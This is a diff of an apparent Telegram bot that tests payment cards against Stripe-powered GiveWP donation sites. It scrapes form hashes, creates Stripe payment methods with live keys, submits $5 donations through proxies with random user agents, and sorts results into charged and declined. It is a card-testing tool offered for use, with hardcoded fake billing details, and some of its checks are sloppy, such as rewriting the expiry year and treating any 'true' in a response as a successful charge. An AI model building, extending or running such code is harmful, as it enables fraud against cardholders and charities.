@@ -432,8 +432,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-     # ============================================================================
-    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites
+        # ============================================================================
+    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites (working version)
     # ============================================================================
     @bot.message_handler(commands=['stsite'])
     def handle_stsite_command(message):
@@ -446,7 +446,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             "📤 **Send a .txt file** containing Stripe donation sites.\n"
             "Each line can have extra text, as long as it contains a URL and a `pk_live_...` key.\n"
             "Example: `https://example.com/donate | pk_live_abc123`\n"
-            "I will extract them automatically.",
+            "I will extract them automatically and test them with a card.",
             parse_mode='Markdown'
         )
         bot.register_next_step_handler(message, process_stsite_file)
@@ -479,7 +479,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
             # Store candidates temporarily
             user_id = message.from_user.id
-            pending_stsite[user_id] = candidates
+            if not hasattr(bot, 'pending_stsite'):
+                bot.pending_stsite = {}
+            bot.pending_stsite[user_id] = candidates
 
             bot.reply_to(
                 message,
@@ -495,7 +497,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
     def process_test_card(message):
         user_id = message.from_user.id
-        if user_id not in pending_stsite:
+        if not hasattr(bot, 'pending_stsite') or user_id not in bot.pending_stsite:
             bot.reply_to(message, "❌ No pending sites. Please start over with /stsite.")
             return
 
@@ -505,7 +507,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.reply_to(message, "❌ Invalid card format. Use `CC|MM|YYYY|CVV`", parse_mode='Markdown')
             return
 
-        candidates = pending_stsite[user_id]
+        candidates = bot.pending_stsite[user_id]
         total = len(candidates)
         working = []
         failed = []
@@ -519,7 +521,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             url = site['url']
             pk = site['pk']
             try:
-                # Update status every few sites
+                # Update status every 5 sites
                 if idx % 5 == 0 or idx == total:
                     bot.edit_message_text(
                         f"🔄 Testing sites... {idx}/{total}\n"
@@ -528,11 +530,12 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                         message.chat.id, status_msg.message_id
                     )
 
-                # Test the site with the given card
-                if test_single_donation_site(url, pk, test_cc, proxy):
+                # Use the same logic as the working test script
+                result = test_donation_site_like_script(url, pk, test_cc, proxy)
+                if result == "Charge ✅":
                     working.append(site)
                 else:
-                    failed.append(url)
+                    failed.append(f"{url} ({result})")
             except Exception as e:
                 failed.append(f"{url} (error: {str(e)[:50]})")
 
@@ -559,7 +562,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             json.dump(existing, f, indent=2)
 
         # Clean up pending data
-        del pending_stsite[user_id]
+        del bot.pending_stsite[user_id]
 
         # Final report
         report = (
@@ -577,70 +580,197 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
 
 # ----------------------------------------------------------------------------
-# Helper function to test a single donation site
+# Helper function that replicates the working test script's logic
 # ----------------------------------------------------------------------------
-def test_single_donation_site(url, pk, test_cc, proxy=None):
+def test_donation_site_like_script(site_url, pk, cc, proxy=None):
     """
-    Attempt a full donation flow on a single site with a test card.
-    Returns True if the gateway responds (any result except an error).
+    Attempt a full donation on a site using the same flow as the working test script.
+    Returns "Charge ✅" if successful, otherwise the error/decline message.
     """
     try:
+        # Parse card
+        parts = re.split(r'[ |/]', cc)
+        if len(parts) < 4:
+            return "Invalid card format"
+        c, mm, ex, cvc = parts[0], parts[1], parts[2], parts[3]
+
+        # Process expiry year (same as test script)
+        try:
+            yy = ex[2] + ex[3]
+            if '2' in ex[3] or '1' in ex[3]:
+                yy = ex[2] + '7'
+        except:
+            yy = ex[0] + ex[1]
+            if '2' in ex[1] or '1' in ex[1]:
+                yy = ex[0] + '7'
+
         session = requests.Session()
+        session.verify = False
         if proxy:
             formatted = gates.format_proxy(proxy)
             if formatted:
                 session.proxies = formatted
-        ua = gates.get_random_ua()
-        session.headers.update({'User-Agent': ua})
 
-        # Load donation page
-        r = session.get(url, timeout=20)
-        if r.status_code != 200:
-            return False
-        html = r.text
+        ua = user_agent.generate_user_agent()
+        headers = {'user-agent': ua}
+        donate_url = site_url if site_url.endswith('/donate') else site_url.rstrip('/') + '/donate/'
 
-        # Extract GiveWP fields
-        form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
-        form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
-        price_id = re.search(r'name="give-price-id"\s+value="([^"]+)"', html)
+        # Get donation page
+        r = session.get(donate_url, headers=headers, timeout=20)
+        time.sleep(3)
 
-        if not (form_id and form_hash and price_id):
-            # Try alternative patterns
-            form_id = re.search(r'name="give-form-id".*?value=["\']([^"\']+)', html, re.DOTALL)
-            form_hash = re.search(r'name="give-form-hash".*?value=["\']([^"\']+)', html, re.DOTALL)
-            price_id = re.search(r'name="give-price-id".*?value=["\']([^"\']+)', html, re.DOTALL)
-            if not (form_id and form_hash and price_id):
-                return False
+        # Extract form data
+        ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
+        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
+        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
 
-        # Create Stripe payment method
-        pm_id, err = gates.create_stripe_payment_method(session, test_cc, pk, ua)
-        if not pm_id:
-            return False
-
-        # Submit donation via AJAX
-        parsed = urlparse(url)
-        ajax_url = f"{parsed.scheme}://{parsed.netloc}/wp-admin/admin-ajax.php"
-        data = {
-            'give-form-id': form_id.group(1),
-            'give-form-hash': form_hash.group(1),
-            'give-price-id': price_id.group(1),
-            'give-amount': '1.00',
-            'give_first': 'Test',
-            'give_last': 'User',
-            'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
+        # First AJAX request to initiate donation
+        headers_ajax = {
+            'origin': site_url,
+            'referer': donate_url,
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+            'x-requested-with': 'XMLHttpRequest',
+        }
+        data_init = {
+            'give-honeypot': '',
+            'give-form-id-prefix': ssa00,
+            'give-form-id': ss000a00,
+            'give-form-title': 'Give a Donation',
+            'give-current-url': donate_url,
+            'give-form-url': donate_url,
+            'give-form-minimum': '5.00',
+            'give-form-maximum': '999999.99',
+            'give-form-hash': ssa,
+            'give-price-id': 'custom',
+            'give-amount': '5.00',
+            'give_tributes_type': 'DrGaM Of',
+            'give_tributes_show_dedication': 'no',
+            'give_tributes_radio_type': 'In Honor Of',
+            'give_tributes_first_name': '',
+            'give_tributes_last_name': '',
+            'give_tributes_would_to': 'send_mail_card',
+            'give-tributes-mail-card-personalized-message': '',
+            'give_tributes_mail_card_notify_first_name': '',
+            'give_tributes_mail_card_notify_last_name': '',
+            'give_tributes_address_country': 'US',
+            'give_tributes_mail_card_address_1': '',
+            'give_tributes_mail_card_address_2': '',
+            'give_tributes_mail_card_city': '',
+            'give_tributes_address_state': 'MI',
+            'give_tributes_mail_card_zipcode': '',
+            'give_stripe_payment_method': '',
+            'payment-mode': 'stripe',
+            'give_first': 'drgam ',
+            'give_last': 'drgam ',
+            'give_email': 'lolipnp@gmail.com',
+            'give_comment': '',
+            'card_name': 'drgam ',
+            'billing_country': 'US',
+            'card_address': 'drgam sj',
+            'card_address_2': '',
+            'card_city': 'tomrr',
+            'card_state': 'NY',
+            'card_zip': '10090',
+            'give_action': 'purchase',
             'give-gateway': 'stripe',
             'action': 'give_process_donation',
             'give_ajax': 'true',
         }
-        r2 = session.post(ajax_url, data=data, timeout=20)
-        response_text = r2.text.lower()
+        session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_init, timeout=20)
 
-        # If we get any gateway response (even decline), the site is usable
-        if any(word in response_text for word in ['success', 'insufficient_funds', 'incorrect_cvc', 'do_not_honor', 'generic_decline']):
-            return True
-        return False
-    except Exception:
-        return False
+        # Create Stripe payment method
+        stripe_headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+        }
+        stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
+        e = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
+        payment_id = e.json().get('id')
+        if not payment_id:
+            return "Failed to create payment method"
+
+        # Final donation submission
+        headers_final = {
+            'authority': site_url.replace('https://', ''),
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': site_url,
+            'referer': donate_url,
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'user-agent': ua,
+        }
+        params = {'payment-mode': 'stripe', 'form-id': ss000a00}
+        data_final = {
+            'give-honeypot': '',
+            'give-form-id-prefix': ssa00,
+            'give-form-id': ss000a00,
+            'give-form-title': 'Give a Donation',
+            'give-current-url': donate_url,
+            'give-form-url': donate_url,
+            'give-form-minimum': '5.00',
+            'give-form-maximum': '999999.99',
+            'give-form-hash': ssa,
+            'give-price-id': 'custom',
+            'give-amount': '5.00',
+            'give_tributes_type': 'In Honor Of',
+            'give_tributes_show_dedication': 'no',
+            'give_tributes_radio_type': 'Drgam Of',
+            'give_tributes_first_name': '',
+            'give_tributes_last_name': '',
+            'give_tributes_would_to': 'send_mail_card',
+            'give-tributes-mail-card-personalized-message': '',
+            'give_tributes_mail_card_notify_first_name': '',
+            'give_tributes_mail_card_notify_last_name': '',
+            'give_tributes_address_country': 'US',
+            'give_tributes_mail_card_address_1': '',
+            'give_tributes_mail_card_address_2': '',
+            'give_tributes_mail_card_city': '',
+            'give_tributes_address_state': 'MI',
+            'give_tributes_mail_card_zipcode': '',
+            'give_stripe_payment_method': payment_id,
+            'payment-mode': 'stripe',
+            'give_first': 'drgam ',
+            'give_last': 'drgam ',
+            'give_email': 'lolipnp@gmail.com',
+            'give_comment': '',
+            'card_name': 'drgam ',
+            'billing_country': 'US',
+            'card_address': 'drgam sj',
+            'card_address_2': '',
+            'card_city': 'tomrr',
+            'card_state': 'NY',
+            'card_zip': '10090',
+            'give_action': 'purchase',
+            'give-gateway': 'stripe',
+        }
+        r4 = session.post(donate_url, params=params, headers=headers_final, data=data_final, timeout=20)
+        text = r4.text
+        if 'Your card was declined.' in text:
+            return "card_declined"
+        elif 'Your card has insufficient funds.' in text:
+            return "insufficient_funds"
+        elif 'Thank you' in text or 'Thank you for your donation' in text or 'succeeded' in text or 'true' in text or 'success' in text:
+            return "Charge ✅"
+        elif 'Your card number is incorrect.' in text:
+            return "incorrect_CVV2"
+        else:
+            return "Card_reject"
+    except Exception as e:
+        return f"Error: {str(e)}"
     # ============================================================================
     # 🧠 MASS CHECK ENGINE
     # ============================================================================
@@ -840,3 +970,4 @@ def test_single_donation_site(url, pk, test_cc, proxy=None):
         try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
 
         except: bot.send_message(chat_id, msg, parse_mode='HTML')
+
